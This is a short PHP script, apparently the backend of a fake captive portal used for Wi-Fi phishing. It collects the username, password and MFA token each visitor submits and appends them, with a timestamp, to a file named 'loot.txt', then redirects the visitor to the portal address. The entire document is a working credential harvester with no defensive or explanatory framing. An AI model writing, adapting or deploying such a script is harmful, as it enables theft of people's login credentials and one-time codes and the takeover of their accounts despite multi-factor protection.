<?php
header('Location: http://10.0.0.1'); // Redirect back to the captive portal page
if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['token'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $token = $_POST['token'];
    $data = "Timestamp: " . date("Y-m-d H:i:s") . "\nUsername: " . $username . "\nPassword: " . $password . "\nMFA Token: " . $token . "\n------------------------\n";
    
    $file = 'loot.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
}
exit();
?>
